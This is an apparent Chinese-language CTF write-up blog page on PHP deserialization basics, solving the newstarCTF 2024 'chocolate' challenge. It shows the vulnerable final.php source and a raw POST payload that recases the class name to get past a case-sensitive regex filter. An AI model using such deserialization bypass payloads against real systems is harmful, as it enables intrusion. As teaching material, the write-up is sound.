@@ -1,0 +1,184 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>php反序列化基础 | tgrddf55's Blog</title><meta name="author" content="tgrddf55"><meta name="copyright" content="tgrddf55"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="题目链接newstarCTF 2024 chocolate 反序列化基础 https:&#x2F;&#x2F;hello-ctf.com&#x2F;hc-web&#x2F;php_unser_base&#x2F;  序列化就是从对象变成字符串 反序列化就是从字符串变回对象 比如： &lt;?phpclass User &#123;    public $name;    protected $email;    private $phoneNum">
+<meta property="og:type" content="article">
+<meta property="og:title" content="php反序列化基础">
+<meta property="og:url" content="http://example.com/2025/06/27/2025-06-26-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/index.html">
+<meta property="og:site_name" content="tgrddf55&#39;s Blog">
+<meta property="og:description" content="题目链接newstarCTF 2024 chocolate 反序列化基础 https:&#x2F;&#x2F;hello-ctf.com&#x2F;hc-web&#x2F;php_unser_base&#x2F;  序列化就是从对象变成字符串 反序列化就是从字符串变回对象 比如： &lt;?phpclass User &#123;    public $name;    protected $email;    private $phoneNum">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/image/52.jpg">
+<meta property="article:published_time" content="2025-06-26T16:00:00.000Z">
+<meta property="article:modified_time" content="2025-06-26T16:00:00.000Z">
+<meta property="article:author" content="tgrddf55">
+<meta property="article:tag" content="web">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/image/52.jpg"><link rel="shortcut icon" href="/imgs/tgrddf55.jpg"><link rel="canonical" href="http://example.com/2025/06/27/2025-06-26-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta/><link rel="stylesheet" href="/css/index.css?v=4.13.0"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.5.1/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"找不到您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":false,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.11.1/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'php反序列化基础',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-06-27 00:00:00'
+}</script><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+        if (t === 'dark') activateDarkMode()
+        else if (t === 'light') activateLightMode()
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/imgs/tgrddf55.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">60</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">29</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><hr class="custom-hr"/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/image/52.jpg')"><nav id="nav"><span id="blog-info"><a href="/" title="tgrddf55's Blog"><span class="site-name">tgrddf55's Blog</span></a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search" href="javascript:void(0);"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">php反序列化基础</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-06-26T16:00:00.000Z" title="发表于 2025-06-27 00:00:00">2025-06-27</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-06-26T16:00:00.000Z" title="更新于 2025-06-27 00:00:00">2025-06-27</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/web/">web</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">783</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>3分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="php反序列化基础"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h1><p><a target="_blank" rel="noopener" href="https://ctf.xidian.edu.cn/training/14?challenge=646">newstarCTF 2024 <strong>chocolate</strong></a></p>
+<h1 id="反序列化基础"><a href="#反序列化基础" class="headerlink" title="反序列化基础"></a>反序列化基础</h1><blockquote>
+<p><a target="_blank" rel="noopener" href="https://hello-ctf.com/hc-web/php_unser_base/">https://hello-ctf.com/hc-web/php_unser_base/</a></p>
+</blockquote>
+<p>序列化就是从对象变成字符串</p>
+<p>反序列化就是从字符串变回对象</p>
+<p>比如：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$email</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$phoneNumber</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$email</span>,<span class="variable">$phoneNumber</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;email = <span class="variable">$email</span>;</span><br><span class="line">        <span class="variable language_">$this</span> -&gt;phoneNumber = <span class="variable">$phoneNumber</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getPhoneNumber</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span> -&gt;phoneNumber;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$user</span> = <span class="keyword">new</span> <span class="title class_">User</span>(<span class="keyword">array</span>(<span class="string">&quot;tan&quot;</span>,<span class="string">&quot;ji&quot;</span>), <span class="string">&#x27;admin@probius.xyz&#x27;</span>,<span class="string">&#x27;19191145148&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$serializedData</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$user</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$serializedData</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="variable">$deserializedUser</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$serializedData</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$deserializedUser</span> -&gt; name);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$deserializedUser</span> -&gt; <span class="title function_ invoke__">getPhoneNumber</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>输出：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">&quot;User&quot;</span>:<span class="number">3</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;a:<span class="number">2</span>:&#123;i:<span class="number">0</span>;s:<span class="number">3</span>:<span class="string">&quot;tan&quot;</span>;i:<span class="number">1</span>;s:<span class="number">2</span>:<span class="string">&quot;ji&quot;</span>;&#125;s:<span class="number">8</span>:<span class="string">&quot; * email&quot;</span>;s:<span class="number">17</span>:<span class="string">&quot;admin@probius.xyz&quot;</span>;s:<span class="number">17</span>:<span class="string">&quot; User phoneNumber&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;19191145148&quot;</span>;&#125;</span><br><span class="line"><span class="title function_ invoke__">Array</span></span><br><span class="line">(</span><br><span class="line">    [<span class="number">0</span>] =&gt; tan</span><br><span class="line">    [<span class="number">1</span>] =&gt; ji</span><br><span class="line">)</span><br><span class="line"><span class="number">19191145148</span></span><br></pre></td></tr></table></figure>
+
+<p>有一些魔术方法会在特定的序列化阶段触发从而使开发者能够进一步的控制 序列化 &#x2F; 反序列化 的过程。</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__wakeup() //------ 执行unserialize()时，先会调用这个函数</span><br><span class="line">__sleep() //------- 执行serialize()时，先会调用这个函数</span><br><span class="line">__destruct() //---- 对象被销毁时触发</span><br><span class="line">__call() //-------- 在对象上下文中调用不可访问的方法时触发</span><br><span class="line">__callStatic() //-- 在静态上下文中调用不可访问的方法时触发</span><br><span class="line">__get() //--------- 用于从不可访问的属性读取数据或者不存在这个键都会调用此法</span><br><span class="line">__set() //--------- 用于将数据写入不可访问的属性</span><br><span class="line">__isset() //------- 在不可访问的属性上调用isset()或empty()触发</span><br><span class="line">__unset() //------- 在不可访问的属性上使用unset()时触发</span><br><span class="line">__toString() //---- 把类当作字符串使用时触发</span><br><span class="line">__invoke() //------ 当尝试将对象调用为函数时触发</span><br></pre></td></tr></table></figure>
+
+<h1 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h1><p>在final.php下</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;source.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$food</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">chocolate</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$cat</span>=<span class="string">&#x27;???&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$kitty</span>=<span class="string">&#x27;???&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cat=<span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;kitty=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eatit</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;cat===<span class="variable language_">$this</span>-&gt;kitty;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;cat;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$darkCocoaPowder</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$darkCocoaPowder</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$milk</span>=@<span class="title function_ invoke__">unserialize</span>(<span class="variable">$food</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/chocolate/&#x27;</span>, <span class="variable">$food</span>))&#123;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;Error <span class="subst">$milk</span>&quot;</span>,<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>意思就是通过post传入字符串，反序列化成milk，然后检测milk里面有没有chocolate，如果有就抛出异常，没有就会执行析构函数，打印$darkCocoaPowder。</p>
+<p>可以在字符串中把chocolate任意字符改成大写。</p>
+<p>另外hackbar没办法发这个包，因为</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$food</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>要求Content-Type: application&#x2F;octet-stream但是hackbar里面没有该类型</p>
+<p>因此可以选择使用burpsuite</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/final.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:29785</span><br><span class="line"><span class="attribute">sec-ch-ua</span><span class="punctuation">: </span>&quot;Not.A/Brand&quot;;v=&quot;99&quot;, &quot;Chromium&quot;;v=&quot;136&quot;</span><br><span class="line"><span class="attribute">sec-ch-ua-mobile</span><span class="punctuation">: </span>?0</span><br><span class="line"><span class="attribute">sec-ch-ua-platform</span><span class="punctuation">: </span>&quot;Windows&quot;</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/octet-stream</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>none</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate, br</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>keep-alive</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">O</span>:<span class="number">9</span>:<span class="string">&quot;Chocolate&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;cat&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;123&quot;</span>;s:<span class="number">5</span>:<span class="string">&quot;kitty&quot;</span>;s:<span class="number">3</span>:<span class="string">&quot;234&quot;</span>;&#125;</span></span><br><span class="line"><span class="language-apache"></span></span><br><span class="line"><span class="language-apache"></span></span><br></pre></td></tr></table></figure>
+
+<p>这样发包即可得到$darkCocoaPowder</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">tgrddf55</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/06/27/2025-06-26-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/">http://example.com/2025/06/27/2025-06-26-php反序列化基础/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">tgrddf55's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/web/">web</a></div><div class="post_share"><div class="social-share" data-image="/image/52.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2025/06/26/2025-06-26-nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" title="php伪协议"><img class="cover" src="/image/56.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">php伪协议</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2025/05/30/2025-05-30-js%E5%85%A5%E9%97%A8/" title="js study"><img class="cover" src="/image/9.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-30</div><div class="title">js study</div></div></a></div><div><a href="/2025/05/31/2025-05-31-css%E5%85%A5%E9%97%A8/" title="css study"><img class="cover" src="/image/41.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-31</div><div class="title">css study</div></div></a></div><div><a href="/2025/06/07/2025-06-07-php%E5%85%A5%E9%97%A8/" title="php study"><img class="cover" src="/image/33.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-07</div><div class="title">php study</div></div></a></div><div><a href="/2025/05/30/2025-05-30-html%E5%85%A5%E9%97%A8/" title="html study"><img class="cover" src="/image/45.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-05-30</div><div class="title">html study</div></div></a></div><div><a href="/2025/06/02/2025-06-02-web%E5%85%A5%E9%97%A8%E9%A2%98%E5%8D%95/" title="web入门题单"><img class="cover" src="/image/48.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-02</div><div class="title">web入门题单</div></div></a></div><div><a href="/2025/06/09/2025-06-09-sql%E5%85%A5%E9%97%A8/" title="sql study"><img class="cover" src="/image/36.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2025-06-09</div><div class="title">sql study</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/imgs/tgrddf55.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">tgrddf55</div><div class="author-info__description">几时归去，做个闲人</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">60</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">29</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">6</div></a></div><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/tgrddf55" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="https://space.bilibili.com/455700704" target="_blank" title="bilibili"><i class="fab fa-bilibili" style="color: #00aeff;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E9%93%BE%E6%8E%A5"><span class="toc-text">题目链接</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80"><span class="toc-text">反序列化基础</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-text">题目分析</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/06/27/2025-06-26-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/" title="php反序列化基础"><img src="/image/52.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="php反序列化基础"/></a><div class="content"><a class="title" href="/2025/06/27/2025-06-26-php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%9F%BA%E7%A1%80/" title="php反序列化基础">php反序列化基础</a><time datetime="2025-06-26T16:00:00.000Z" title="发表于 2025-06-27 00:00:00">2025-06-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/06/26/2025-06-26-nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" title="php伪协议"><img src="/image/56.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="php伪协议"/></a><div class="content"><a class="title" href="/2025/06/26/2025-06-26-nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" title="php伪协议">php伪协议</a><time datetime="2025-06-25T16:00:00.000Z" title="发表于 2025-06-26 00:00:00">2025-06-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/06/26/2025-06-26-php%E4%BC%AA%E5%8D%8F%E8%AE%AE/" title="php伪协议"><img src="/image/17.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="php伪协议"/></a><div class="content"><a class="title" href="/2025/06/26/2025-06-26-php%E4%BC%AA%E5%8D%8F%E8%AE%AE/" title="php伪协议">php伪协议</a><time datetime="2025-06-25T16:00:00.000Z" title="发表于 2025-06-26 00:00:00">2025-06-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/06/14/2025-06-14-python_ssti/" title="python_ssti"><img src="/image/22.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="python_ssti"/></a><div class="content"><a class="title" href="/2025/06/14/2025-06-14-python_ssti/" title="python_ssti">python_ssti</a><time datetime="2025-06-13T16:00:00.000Z" title="发表于 2025-06-14 00:00:00">2025-06-14</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/06/13/2025-06-13-php%E5%BC%B1%E6%AF%94%E8%BE%83/" title="php弱比较"><img src="/image/12.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="php弱比较"/></a><div class="content"><a class="title" href="/2025/06/13/2025-06-13-php%E5%BC%B1%E6%AF%94%E8%BE%83/" title="php弱比较">php弱比较</a><time datetime="2025-06-12T16:00:00.000Z" title="发表于 2025-06-13 00:00:00">2025-06-13</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/image/52.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2025 By tgrddf55</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  